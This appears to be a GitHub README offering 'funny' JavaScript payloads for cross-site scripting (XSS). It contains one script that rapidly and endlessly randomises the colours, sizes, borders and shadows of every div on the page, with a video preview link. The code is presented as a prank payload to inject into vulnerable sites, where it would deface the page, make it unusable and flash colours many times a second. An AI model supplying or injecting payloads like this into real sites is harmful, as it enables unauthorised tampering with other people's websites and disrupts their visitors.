# FunnyJSPayloads
funny javascript &amp; html payloads for XSS


## Random Styles
```javascript
var d = document.getElementsByTagName("div");

setInterval(function() {
    for (var i = 0; i < d.length; i++) {
        d[i].style.backgroundColor = gc();
        d[i].style.borderRadius = gs() + "px";
        d[i].style.fontSize = gs() + "rem";
        d[i].style.color = gc();
        d[i].style.border = gs() + "px solid " + gc();
        d[i].style.boxShadow = "0 0 " + gs() + "px " + gc();
        d[i].style.textShadow = "0 0 " + gs() + "px " + gc();
    }
}, 10);

function gc() {var c = "#"; for (var i = 0; i < 6; i++) { c += "0123456789ABCDEF"[Math.floor(Math.random() * 16)]; }return c;}
function gs() {return Math.floor(Math.random() * 10);}
```

### Preview on YouTube
![](https://thumbs.gfycat.com/CloudyDefinitiveAfricanporcupine-mobile.mp4)
